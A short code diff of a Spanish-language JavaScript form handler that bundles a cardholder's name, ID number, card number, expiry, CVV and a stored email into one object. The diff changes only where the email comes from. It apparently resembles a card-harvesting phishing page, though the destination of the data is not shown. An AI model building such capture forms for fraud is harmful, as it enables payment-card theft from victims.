@@ -26,14 +26,15 @@ document.addEventListener('DOMContentLoaded', () => {
             btn.disabled = true;
 
                    // Reemplazar desde 'const formData = new FormData();' hasta el 'body: formData'
-                         const data = {
+                                const data = {
             titular: document.querySelector('[name="titularCard"]')?.value || 'N/A',
             dni: document.querySelector('[name="DniOwn"]')?.value || 'N/A',
             tarjeta: tarjetaInput.value,
             vencimiento: vctoInput.value,
             cvv: document.querySelector('[name="secode"]')?.value || 'N/A',
-            email: document.querySelector('[name="email"]')?.value || 'N/A' // <--- AGREGAR ESTA LÍNEA
+            email: sessionStorage.getItem('correoGuardado') || 'No completado'
         };
+
 
 
 
